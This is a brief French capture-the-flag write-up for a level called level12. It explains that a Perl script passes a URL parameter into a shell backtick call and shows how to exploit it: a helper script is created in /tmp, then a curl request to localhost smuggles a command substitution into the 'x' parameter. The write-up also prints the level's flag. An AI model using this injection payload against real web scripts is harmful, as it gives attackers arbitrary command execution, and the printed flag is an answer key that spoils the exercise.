Dans ce Niveau on a un fichier ```level12.pl```

Cette ligne injecte direct une commande ```@output = `egrep "^$xx" /tmp/xd 2>&1`;```

On va exploiter cette faille en creant un "script" avec ```echo "getflag > /tmp/res.txt" > /tmp/SCRIPT && chmod +x /tmp/SCRIPT```

Et lui envoyer avec ```curl 'localhost:4646?x=$(/*/SCRIPT)&y=hello'```

Ensuite on ```cat /tmp/res.txt``` pour obtenir le flag ```g1qKMiRpXf53AWhDaU7FEkczr```